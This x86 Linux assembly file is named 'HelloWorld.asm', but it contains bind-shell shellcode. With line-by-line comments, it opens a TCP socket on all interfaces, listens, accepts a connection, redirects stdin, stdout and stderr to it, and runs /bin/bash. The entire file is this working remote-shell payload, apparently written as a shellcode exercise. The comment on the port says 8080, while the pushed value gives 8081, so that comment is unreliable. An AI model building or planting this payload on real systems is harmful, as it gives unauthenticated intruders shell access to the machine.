; HelloWorld.asm
; Author: TrulyOutrageous

global _start

section .text
_start:

	; First syscall is to set up the socket using sys_socketcall 0x66
	; will require sys_socketcall to call "sys_socket", by passing it 0x1 in EBX
	; ECX will be used to pass a pointer to parameters to "sys_socket"

	xor eax,eax
	xor ebx,ebx
	push eax ; this is pushing 0x0 to the stack which will be the "int protocol" param for sys_socket for a tcp socket
	inc ebx
	push ebx ; this is pushing 0x1 to the stack which will be the "int type" param for sys_socket for a SOCK_STREAM
	push byte 0x2 ; push 0x2 to stack. Will be "int domain" param for sys_socket, which is AF_INET/IPv4
	mov ecx, esp ; put the address of the stack pointer into ECX. This is a pointer for the arguments passed to sys_socket
	mov al, 0x66
	int 0x80

	; Next will need to bind an address/port to the socket
	; the file descriptor created by the socket will be stored in EAX
	xor ebx,ebx ; 0 out ebx
	
	; pushing the the value for sockaddr. First push the address which is 0x0, or all interfaces. Then push the port number
	; which is 8080 in decimal or 1f90 in hex. Then set the type/domain/whatever to 0x2 or AF_INET/IPv4
	push ebx ; null terminator
	push word 0x911f ; port number. 8080 in hex is 1f90. 0x901f is 8080 in reverse order
	push word 0x2 ; push 0x2 to use AF_INET/IPv4

	mov ecx, esp ; put stack pointer address in ECX. This is a pointer to the parameters defined above for the sockaddr

	; now set up the stack to contain the parameters for the bin. This is the socket file descriptor, the pointer to the values for
	; sockadd, and the length of the address
	push 0x10 ; size of the server address or 16 in decimal
	push ecx ; pointer to the values for sockaddr
	push eax ; eax contains the FD of the socket from the last syscall
	mov ecx, esp ; after above is done, set ECX to the stack pointer address so it can all be passed to sys_socketcall

	; make the syscall for the bind
	mov bl, 0x2 ; moving 0x2 into EBX so that the bind call from sys_socketcall will be used
	mov al, 0x66
	int 0x80


	; setup the "listen" sys_socketcall. Need to provide listen with the socket file descriptor and a "backlog", which
	xor ebx,ebx
	push ebx ; this is "int backlog" for listen. It will be 0
	push dword [ecx] ; ecx is currently pointing at the file descriptor from the previous syscall. Push to the stack
	mov ecx, esp ; put the pointer to the parameters needed for listen into ECX to be used in the sys_socketcall

	mov al, 0x66
	mov bl, 0x4
	int 0x80

	; set up the socket "accept". All that's really needed is the socket FD which ECX points to, and then two nulls
	push 0x10
	push eax
	push dword [ecx] ; ECX stores the address that points to the value 0x3, or the socket FD
	mov ecx,esp ; move stack pointer into ECX since that will be needed for the args in the sys_socketcall

	mov bl, 0x5
	mov al, 0x66
	int 0x80

	; set up the input/output for the accept connection. Will need to use dup2 to copy the 
	mov ebx,eax ; eax contains the FD for the socket. Move value EAX into EBX as EBX needs the FD value for the dup2 call
	xor ecx,ecx
	mov cl, 0x2 ; ecx is being used for the "new" FD to duplicate the socket FD in. Need it to be for 0,1,2

	;this will perform the dup2 syscall three times to copy the socket FD into the "new" FDs of 2, then 1, then 0. This is to get stdin, stdout, and stderr
dup:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns dup


	; after the new FD's have been created, need to set up the execve call for /bin/bash so that the new connection gets a shell
	;push the dword of nulls onto the stack
	xor eax,eax
	push eax

	;push the string of "////bin/bash" onto the stack. Extra slashes to pad out the string to a multiple of four
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	; ////bin/bash is on the stack, at the ESP register. So, to get the address of the location of the string into ebx, mov esp into ebx
	mov ebx, esp

	; push another null to get EDX to point to a memory address that is a dword of nulls
	push eax
	mov edx, esp

	; now for ecx, we need the address of EBX on the stack
	push ebx
	mov ecx, esp

	; make the syscall
	mov al, 0xb
	int 0x80	
